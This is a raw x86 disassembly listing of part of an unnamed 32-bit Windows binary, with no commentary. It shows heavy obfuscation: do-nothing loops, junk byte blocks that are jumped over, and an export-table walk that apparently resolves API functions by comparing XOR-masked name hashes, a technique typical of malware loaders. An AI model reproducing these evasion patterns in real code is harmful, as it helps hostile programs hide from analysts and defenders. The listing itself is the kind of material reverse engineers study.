  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x433767,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x4337a3,0x4337d7
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x4337d7,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433717
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x4337a3,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x4336d7,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x4337f7
  4101b6:	mov    esi,DWORD PTR ds:0x43380b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x4336e3,0x43371b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x4337b3,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x4337b3
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x4337b3,ecx
  4101f0:	cmp    DWORD PTR ds:0x4337b3,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433994
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x4337b3,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x4337e3,edi
  410254:	xor    esi,esi
  410256:	and    DWORD PTR ds:0x4337d7,0x0
  410260:	mov    ecx,DWORD PTR ds:0x4337d7
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x4337d7,ecx
  41026d:	cmp    DWORD PTR ds:0x4337d7,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x4337d7,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x4337d7
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x4337d7,ecx
  4102a4:	cmp    DWORD PTR ds:0x4337d7,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
  4102ba:	and    DWORD PTR ds:0x4337a3,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x4337a3
  4102cc:	inc    ecx
  4102cd:	mov    DWORD PTR ds:0x4337a3,ecx
  4102d3:	cmp    DWORD PTR ds:0x4337a3,0x22
  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x4337a3,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x43376b
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x4337ab,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x433763,0x4336c7
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x4337b3,0x0
  410325:	mov    eax,ds:0x4337b3
  41032a:	inc    eax
  41032b:	mov    ds:0x4337b3,eax
  410330:	cmp    DWORD PTR ds:0x4337b3,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x4337b3,0xc
  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x4337b3
  41035a:	inc    eax
  41035b:	mov    ds:0x4337b3,eax
  410360:	cmp    DWORD PTR ds:0x4337b3,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x433763
  410379:	sbb    eax,DWORD PTR ds:0x4337e3
  41037f:	mov    ds:0x433763,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x43372b
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x4336e7,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x4336c7,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x4336c7
  4103ba:	inc    eax
  4103bb:	mov    ds:0x4336c7,eax
  4103c0:	cmp    DWORD PTR ds:0x4336c7,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x4336c7,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x4336c7,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x4336c7
  4103f8:	inc    eax
  4103f9:	mov    ds:0x4336c7,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x4337d7,0x1e
  41040d:	cmp    DWORD PTR ds:0x4337d7,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x4337d7,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x4339f4
  41042f:	push   0x4336df
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x4337d7,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x4337d7
  41044c:	dec    eax
  41044d:	mov    ds:0x4337d7,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x4337d7
  41045a:	dec    eax
  41045b:	mov    ds:0x4337d7,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x4337d7,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x433727,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43371b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x433763,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	push   edx
  4104bd:	xor    dl,al
  4104bf:	and    eax,0x7c7cbe99
  4104c4:	adc    bh,BYTE PTR [edi+0x7c]
  4104c7:	jl     0x4104d4
  4104c9:	adc    eax,0x3cafeb75
  4104ce:	sbb    DWORD PTR [ecx],ecx
  4104d0:	mov    cl,0x47
  4104d2:	xchg   esp,eax
  4104d3:	into   
  4104d4:	fsubr  st,st(5)
  4104d6:	or     edi,DWORD PTR [edx]
  4104d8:	jb     0x41051f
  4104da:	addr16 rcr cl,1
  4104dd:	or     DWORD PTR [esi+0x6f577f6e],esi
  4104e3:	jge    0x41054c
  4104e5:	inc    eax
  4104e6:	xchg   ecx,eax
  4104e7:	lock lods eax,DWORD PTR ds:[esi]
  4104e9:	enter  0x8e9d,0x71
  4104ed:	pop    es
  4104ee:	pop    edx
  4104ef:	lock cmp al,0x88
  4104f2:	sbb    eax,0x1ea72a8
  4104f7:	scas   al,BYTE PTR es:[edi]
  4104f8:	xchg   ecx,eax
  4104f9:	push   edx
  4104fa:	sub    BYTE PTR [ebx],bl
  4104fc:	dec    edi
  4104fd:	pop    ss
  4104fe:	enter  0x4155,0xe1
  410502:	js     0x41050b
  410504:	mov    eax,0x4869d49a
  410509:	mov    ebp,0x75aae690
  41050e:	call   0x2a5a:0xc0906bc1
  410515:	sbb    BYTE PTR [edi],bl
  410517:	dec    ecx
  410518:	xchg   ebp,eax
  410519:	fld    QWORD PTR [ecx-0x59]
  41051c:	jmp    0x4104a5
  41051e:	test   eax,0xe6da6565
  410523:	xor    al,0x13
  410525:	mov    ds,WORD PTR [eax-0x7d09f334]
  41052b:	cmove  eax,DWORD PTR [ecx]
  41052e:	adc    dl,BYTE PTR [edi-0x1a55050b]
  410534:	outs   dx,DWORD PTR ds:[esi]
  410535:	dec    ebx
  410536:	xchg   DWORD PTR [edi+0x4c06044],edx
  41053c:	ror    ah,0x51
  41053f:	enter  0xba88,0x57
  410543:	lods   al,BYTE PTR ds:[esi]
  410544:	mov    edx,0x7cbb6c27
  410549:	jge    0x410525
  41054b:	nop
  41054c:	or     cl,ch
  41054e:	(bad)  
  41054f:	fisub  DWORD PTR [edx-0x7d]
  410552:	repz mov ebx,0x664c0fc4
  410558:	xlat   BYTE PTR ds:[ebx]
  410559:	in     eax,0x93
  41055b:	les    esp,FWORD PTR [esi+0xc470e68]
  410561:	mov    ebp,0xeb55b5f2
  410566:	call   0xa034:0xeda088e9
  41056d:	push   ds
  41056e:	xchg   edi,eax
  41056f:	rcl    DWORD PTR [eax+0x7c92ba4],1
  410575:	pop    eax
  410576:	shl    BYTE PTR [esi+0x6a],1
  410579:	xchg   ebx,eax
  41057a:	lds    eax,FWORD PTR [eax]
  41057c:	hlt    
  41057d:	mov    bh,0x4c
  41057f:	das    
  410580:	nop
  410581:	jp     0x41053b
  410583:	out    dx,al
  410584:	sub    eax,0x8f684dd4
  410589:	jp     0x410558
  41058b:	test   BYTE PTR [ebx+0x7a981d3],bl
  410591:	lahf   
  410592:	or     dh,BYTE PTR [edx-0x3d]
  410595:	pop    ebx
  410596:	xchg   esp,eax
  410597:	jmp    0xa4d5:0xc6e1275c
  41059e:	jecxz  0x410606
  4105a0:	mov    bh,0xe0
  4105a2:	in     eax,0x5f
  4105a4:	neg    DWORD PTR [eax-0x40]
  4105a7:	outs   dx,BYTE PTR ds:[esi]
  4105a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105a9:	jmp    0x3a20c94a
  4105ae:	sub    al,0x2e
  4105b0:	push   ebp
  4105b1:	jnp    0x410542
  4105b3:	inc    ebx
  4105b4:	shr    DWORD PTR [ebp+0x5297c922],0xf7
  4105bb:	jae    0x410613
  4105bd:	les    esp,FWORD PTR [eax+edi*2]
  4105c0:	pop    esi
  4105c1:	pop    ebp
  4105c2:	rol    esp,0xfd
  4105c5:	sbb    dh,BYTE PTR [edi-0x60]
  4105c8:	inc    edx
  4105c9:	pop    ss
  4105ca:	shr    DWORD PTR [esp+esi*4-0x34],0xa4
  4105cf:	(bad)  
  4105d0:	pusha  
  4105d1:	mov    dh,0xcb
  4105d3:	iret   
  4105d4:	mov    ch,0x9b
  4105d6:	add    al,0xe0
  4105d8:	into   
  4105d9:	gs jno 0x41058c
  4105dc:	and    al,0x44
  4105de:	(bad)  
  4105df:	and    ebx,edx
  4105e1:	jmp    0x410656
  4105e3:	out    0x2,eax
  4105e5:	pop    ebp
  4105e6:	mov    eax,DWORD PTR [ebp-0x4]
  4105e9:	sbb    DWORD PTR ds:0x433757,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x4336cf,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x4337af
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x4337af,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x43375f,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x410680
  410648:	aaa    
  410649:	pop    esi
  41064a:	sar    DWORD PTR [edi+0x127c7cb9],1
  410650:	jg     0x4106ce
  410652:	jl     0x41061b
  410654:	cmp    al,0x61
  410656:	(bad)  
  410657:	cmp    DWORD PTR [eax+0x590eb5f7],ebp
  41065d:	cmp    ebx,DWORD PTR [esp+edx*1-0x4b]
  410661:	mov    ch,0xa7
  410663:	push   ss
  410664:	das    
  410665:	loop   0x41068c
  410667:	mov    ds:0x44b1d8d3,al
  41066c:	push   0xffffffdf
  41066e:	jmp    0xb51539a7
  410673:	and    BYTE PTR [ecx+edx*4+0x78f53102],dl
  41067a:	add    BYTE PTR [ebx+0xd],al
  41067d:	xchg   edi,eax
  41067e:	leave  
  41067f:	fwait
  410680:	mov    bh,0xb9
  410682:	int3   
  410683:	repnz or al,0x9d
  410686:	outs   dx,BYTE PTR ds:[esi]
  410687:	arpl   di,bx
  410689:	cmp    ah,BYTE PTR [ebx-0x5c]
  41068c:	sbb    BYTE PTR [ecx+0x2e],0xd8
  410690:	scas   eax,DWORD PTR es:[edi]
  410691:	or     eax,0xc5bb198e
  410696:	mov    ah,0xf5
  410698:	cld    
  410699:	ds xchg edx,eax
  41069b:	shl    DWORD PTR [ebp+0x3c95a80],cl
  4106a1:	loopne 0x410657
  4106a3:	mov    ds:0x31300724,eax
  4106a8:	sbb    al,0x1d
  4106aa:	hlt    
  4106ab:	sti    
  4106ac:	aas    
  4106ad:	pop    ebx
  4106ae:	dec    edx
  4106af:	push   edi
  4106b0:	mov    ds:0xf0b8efbc,eax
  4106b5:	inc    edx
  4106b6:	sub    BYTE PTR [edx-0x71233b2d],dh
  4106bc:	mov    dh,0x67
  4106be:	cld    
  4106bf:	jmp    0xa6a5:0x9fa8683a
  4106c6:	lock mov ds:0x784ff112,al
  4106cc:	in     eax,dx
  4106cd:	ficom  WORD PTR ss:[eax]
  4106d0:	enter  0x3e7b,0x0
  4106d4:	sub    BYTE PTR [edx-0x71050ac2],0x18
  4106db:	mov    ah,0xbf
  4106dd:	and    DWORD PTR [ecx],0x65
  4106e0:	adc    DWORD PTR [esp+esi*4-0x2],ebp
  4106e4:	mov    ch,0xf5
  4106e6:	retf   
  4106e7:	push   edx
  4106e8:	mov    al,0x33
  4106ea:	mov    ecx,0xbd0e41ea
  4106ef:	fmul   st,st(4)
  4106f1:	outs   dx,DWORD PTR ds:[esi]
  4106f2:	cwde   
  4106f3:	lea    eax,[edi+0x8]
  4106f6:	lock xor bl,BYTE PTR [eax-0x636d3c31]
  4106fd:	sbb    al,ch
  4106ff:	bts    DWORD PTR [edi-0x6e],ecx
  410703:	lea    edi,[eax]
  410705:	rcr    DWORD PTR [ecx-0x20f848a8],1
  41070b:	fucomi st,st(7)
  41070d:	or     BYTE PTR [eax],bl
  41070f:	dec    ebx
  410710:	mov    bl,0x3d
  410712:	cmp    eax,DWORD PTR [esi-0x23]
  410715:	mov    ds:0x383a7690,eax
  41071a:	sbb    BYTE PTR [ebx+ebp*4-0x3515df4f],dh
  410721:	adc    al,0x59
  410723:	sbb    DWORD PTR [ecx+esi*2],eax
  410726:	adc    al,0xf0
  410728:	sub    BYTE PTR [esi+0x2c],dl
  41072b:	scas   al,BYTE PTR es:[edi]
  41072c:	inc    edi
  41072d:	push   esi
  41072e:	mov    bl,0x8c
  410730:	shl    BYTE PTR [edx],1
  410732:	push   edi
  410733:	(bad)  
  410734:	xchg   ecx,eax
  410735:	push   esi
  410736:	or     al,0x89
  410738:	fistp  QWORD PTR ss:[ebp-0x3c]
  41073c:	dec    esi
  41073d:	xor    DWORD PTR [esi-0xc],ebp
  410740:	dec    edi
  410741:	sbb    dh,BYTE PTR [eax+0x70]
  410744:	add    esp,esp
  410746:	jmp    0x410714
  410748:	add    BYTE PTR [ecx-0x2521b552],dl
  41074e:	jnp    0x41074d
  410750:	hlt    
  410751:	daa    
  410752:	or     ebx,DWORD PTR [esi]
  410754:	and    DWORD PTR [edx-0x4c],edi
  410757:	(bad)  
  410758:	fdivr  DWORD PTR [ebp-0x1de50cfe]
  41075e:	call   0xebea:0x8970a612
  410765:	test   esp,edx
  410767:	dec    ebp
  410768:	(bad)  
  410769:	dec    esi
  41076a:	inc    ecx
  41076b:	ins    DWORD PTR es:[edi],dx
  41076c:	(bad)  
  41076d:	fstp   TBYTE PTR [eax+0x56]
  410770:	scas   al,BYTE PTR es:[edi]
  410771:	mov    ecx,DWORD PTR [ebp-0x14]
  410774:	add    DWORD PTR ds:0x4336e7,0x3989
  41077e:	xor    eax,esi
  410780:	sbb    DWORD PTR ds:0x4336e3,0x4336cf
  41078a:	add    eax,ebx
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x433723,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x4337e3
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0x8b2fac5a,eax
  4107e5:	into   
  4107e6:	add    DWORD PTR [ebp-0x48],ebx
  4107e9:	jl     0x410867
  4107eb:	adc    bh,BYTE PTR [edi+0x7c]
  4107ee:	jl     0x410776
  4107f0:	inc    edi
  4107f1:	out    0xb3,al
  4107f3:	adc    eax,edx
  4107f5:	(bad)  
  4107f6:	cmovp  eax,DWORD PTR [ebx+ebp*2+0x75ddf609]
  4107fe:	mov    cl,0x22
  410800:	or     ebx,ebx
  410802:	sbb    al,0x45
  410804:	scas   al,BYTE PTR es:[edi]
  410805:	bound  ecx,QWORD PTR [eax-0x1e]
  410808:	xor    ebx,ecx
  41080a:	sbb    al,BYTE PTR [ecx+edi*4]
  41080d:	aad    0xaa
  41080f:	out    dx,al
  410810:	test   BYTE PTR [edx-0x495f80d7],cl
  410816:	mov    WORD PTR [esi+0x38],ds
  410819:	cdq    
  41081a:	js     0x4107be
  41081c:	pop    es
  41081d:	lea    esp,[esp+ecx*8-0x5c]
  410821:	call   0x79ed699d
  410826:	loope  0x41089f
  410828:	cmp    esp,DWORD PTR [edi-0x37]
  41082b:	in     eax,dx
  41082c:	mov    bh,0xe9
  41082e:	pop    ebp
  41082f:	inc    eax
  410830:	sub    al,cl
  410832:	aaa    
  410833:	cmp    eax,0x250cecd4
  410838:	rol    DWORD PTR [bx+si-0x5d],cl
  41083c:	int    0xa7
  41083e:	inc    ecx
  41083f:	xor    dl,al
  410841:	ficom  DWORD PTR es:[esi-0x61]
  410845:	icebp  
  410846:	jge    0x41089e
  410848:	nop
  410849:	xor    BYTE PTR cs:[ecx-0x55],dh
  41084d:	sub    ebx,DWORD PTR [edx-0x8]
  410850:	jmp    0x41080c
  410852:	sbb    eax,0x73ef9da
  410857:	xchg   edx,eax
  410858:	push   0xc1faa724
  41085d:	test   ebp,edi
  41085f:	fld    DWORD PTR [edi]
  410861:	leave  
  410862:	fcmove st,st(4)
  410864:	mov    dl,0xf8
  410866:	fdivr  st,st(0)
  410868:	push   0xffffff8c
  41086a:	mov    eax,0xc0f9ed41
  41086f:	ret    0x5ce9
  410872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410873:	dec    eax
  410874:	mov    ch,0x1b
  410876:	mov    cl,0x4e
  410878:	dec    edx
  410879:	xlat   BYTE PTR ds:[ebx]
  41087a:	enter  0xaa65,0x6a
  41087e:	pusha  
  41087f:	bound  ebx,QWORD PTR [edi]
  410881:	leave  
  410882:	ret    0x7908
  410885:	adc    eax,0x1e1600fd
  41088a:	sub    al,bh
  41088c:	push   ebx
  41088d:	popf   
  41088e:	xor    eax,0x4d472d60
  410893:	xor    ax,sp
  410896:	or     bl,bl
  410898:	pusha  
  410899:	test   DWORD PTR [ebx+ebx*1+0x52],edx
  41089d:	enter  0x1056,0xef
  4108a1:	pushf  
  4108a2:	(bad)
  4108a5:	and    edi,DWORD PTR [edi]
  4108a7:	ins    DWORD PTR es:[edi],dx
  4108a8:	retf   0x4b79
  4108ab:	in     eax,0x1a
  4108ad:	test   BYTE PTR ds:[ebp-0x31881cff],dl
  4108b4:	pop    edi
  4108b5:	retf   
  4108b6:	jnp    0x4108da
  4108b8:	cld    
  4108b9:	inc    ebp
  4108ba:	inc    esi
  4108bb:	mov    DWORD PTR [ebx-0x200bbd41],ebp
  4108c1:	out    dx,al
  4108c2:	ret    0x67c6
  4108c5:	and    eax,0xda55d310
  4108ca:	push   esi
  4108cb:	push   0xfffffff9
  4108cd:	mov    eax,0x7a003bc3
  4108d2:	push   cs
  4108d3:	fldcw  WORD PTR [edx-0x50]
  4108d6:	sbb    edi,DWORD PTR [ecx]
  4108d8:	mov    cs,ebx
  4108da:	dec    ebp
  4108db:	sub    eax,0x36795e20
  4108e0:	loope  0x410946
  4108e2:	xchg   ecx,eax
  4108e3:	stos   BYTE PTR es:[edi],al
  4108e4:	jbe    0x4108d1
  4108e6:	cmp    cl,BYTE PTR [edi]
  4108e8:	lods   eax,DWORD PTR ds:[esi]
  4108e9:	sub    ax,0x40ba
  4108ed:	mov    ebx,DWORD PTR [eax-0x30]
  4108f0:	add    al,0x79
  4108f2:	xor    ebp,DWORD PTR [ecx]
  4108f4:	(bad)  
  4108f5:	in     eax,0x84
  4108f7:	(bad)  
  4108f8:	(bad)  
  4108f9:	sub    eax,0x971f0d52
  4108fe:	sahf   
  4108ff:	pop    ebp
  410900:	retf   0xaa9a
  410903:	xor    bh,dl
  410905:	jl     0x4108a7
  410907:	enter  0xb346,0x5b
  41090b:	mov    ah,0x74
  41090d:	mov    ecx,DWORD PTR [ebp+0x8]
  410910:	add    ecx,DWORD PTR [eax+edi*4]
  410913:	lea    eax,[ebp-0x8]
  410916:	mov    DWORD PTR [ebp-0x30],ecx
  410919:	push   eax
  41091a:	push   DWORD PTR [ebp-0x30]
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     BYTE PTR [ebx-0x58],cl
  41099f:	bound  edx,QWORD PTR [eax+0x7c7cbb73]
  4109a5:	adc    bh,BYTE PTR [edi+0x7c]
  4109a8:	jl     0x4109b8
  4109aa:	xor    DWORD PTR [ebp-0x64],ebp
  4109ad:	and    DWORD PTR [edx],0x936b9877
  4109b3:	cmc    
  4109b4:	or     ah,bl
  4109b6:	mov    al,ds:0x6b2f7bf1
  4109bb:	(bad)  
  4109bc:	or     dl,BYTE PTR [edx-0x49]
  4109bf:	jno    0x41095c
  4109c1:	fnstcw WORD PTR ds:[edi-0x78237d46]
  4109c8:	popf   
  4109c9:	xchg   esp,eax
  4109ca:	(bad)  [edx+0x567837c5]
  4109d0:	or     edi,DWORD PTR [esi]
  4109d2:	xchg   ebx,eax
  4109d3:	(bad)  
  4109d4:	mov    dl,al
  4109d6:	ret    
  4109d7:	adc    al,0xe7
  4109d9:	fadd   st(6),st
  4109db:	jge    0x410975
  4109dd:	push   esp
  4109de:	xor    al,0x52
  4109e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109e1:	(bad)  
  4109e2:	mov    edx,0xbd54ac88
  4109e7:	iret   
  4109e8:	dec    edx
  4109e9:	mov    ah,0x71
  4109eb:	jne    0x4109e6
  4109ed:	fcmovu st,st(3)
  4109ef:	sbb    al,0x4f
  4109f1:	pop    edx
  4109f2:	ret    
  4109f3:	pusha  
  4109f4:	scas   al,BYTE PTR es:[edi]
  4109f5:	dec    ecx
  4109f6:	sub    edx,ebx
  4109f8:	inc    edx
  4109f9:	out    dx,eax
  4109fa:	cld    
  4109fb:	sub    BYTE PTR [ebp-0x7b],cl
  4109fe:	and    BYTE PTR [esi],0xac
  410a01:	fcomp  DWORD PTR [eax-0x42]
  410a04:	cmp    eax,0x41e6ddb0
  410a09:	push   esi
  410a0a:	inc    esi
  410a0b:	stc    
  410a0c:	adc    BYTE PTR [edx-0x688dab9e],bh
  410a12:	test   eax,0x21f9738c
  410a17:	mov    cl,BYTE PTR [ecx-0x6249a545]
  410a1d:	add    al,0x2
  410a1f:	mul    DWORD PTR [ecx-0x2b]
  410a22:	lock inc esi
  410a24:	adc    BYTE PTR [ebx],cl
  410a26:	cdq    
  410a27:	jle    0x4109de
  410a29:	int    0xcc
  410a2b:	mov    ds:0x811955c6,eax
  410a30:	shl    DWORD PTR [esi+0x61],1
  410a33:	fst    DWORD PTR [esi+0x7545a875]
  410a39:	or     BYTE PTR [edi+edx*8+0x4c9d427a],0xfd
  410a41:	lahf   
  410a42:	sbb    ah,al
  410a44:	push   0xffffffa1
  410a46:	nop
  410a47:	xor    al,BYTE PTR [edi+0x6f412]
  410a4d:	or     DWORD PTR [ebx],0x3427175e
  410a53:	mov    eax,0xc892c452
  410a58:	mov    bh,0x1d
  410a5a:	xor    ebp,ecx
  410a5c:	pop    esp
  410a5d:	or     BYTE PTR ss:[ebp+esi*1-0x4bcebfc8],0x7a
  410a66:	xchg   eax,edi
  410a68:	mov    edx,0x2173506a
  410a6d:	daa    
  410a6e:	adc    edi,edx
  410a70:	shl    DWORD PTR [ebx+ecx*4],1
  410a73:	mov    BYTE PTR [edi+0x79ff8c2e],bl
  410a79:	xor    BYTE PTR [edi],ch
  410a7b:	inc    BYTE PTR ds:[ecx-0x5410e936]
  410a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a83:	jnp    0x410a2f
  410a85:	pop    eax
  410a86:	sub    dh,dh
  410a88:	cmp    al,0xfb
  410a8a:	pop    ds
  410a8b:	xchg   edi,eax
  410a8c:	cli    
  410a8d:	(bad)  
  410a8e:	push   ebx
  410a8f:	out    dx,al
  410a90:	inc    ebx
  410a91:	mov    cl,0x80
  410a93:	pop    edx
  410a94:	cmp    esi,DWORD PTR [edx-0x54]
  410a97:	sub    ecx,DWORD PTR [edx+0x7]
  410a9a:	pop    esp
  410a9b:	lds    ebx,FWORD PTR [esi+0x6e]
  410a9e:	xor    ecx,DWORD PTR [edx+0x0]
  410aa1:	mov    ds:0xbb7cd981,al
  410aa6:	xor    DWORD PTR [esi+esi*8],ecx
  410aa9:	jne    0x410aa5
  410aab:	loopne 0x410ab1
  410aad:	stc    
  410aae:	pop    ds
  410aaf:	test   DWORD PTR [esi-0x40],0xc1f17150
